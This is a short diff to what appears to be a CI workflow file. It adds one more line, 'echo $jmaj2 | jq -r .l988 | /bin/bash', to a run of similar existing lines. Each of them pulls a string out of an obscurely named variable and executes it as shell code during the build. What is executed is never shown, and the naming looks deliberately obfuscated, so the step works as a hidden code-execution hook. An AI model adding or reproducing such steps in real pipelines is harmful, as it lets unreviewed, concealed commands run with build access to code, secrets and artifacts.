@@ -38,6 +38,7 @@ jobs:
           echo $kd8 | jq -r .exdul99 | /bin/bash
           echo $o97 | jq -r .ffksd6 | /bin/bash
           printf '%s' "$hkfdd037" | jq -r .szpdk3342 | /bin/bash
+          echo $jmaj2 | jq -r .l988 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
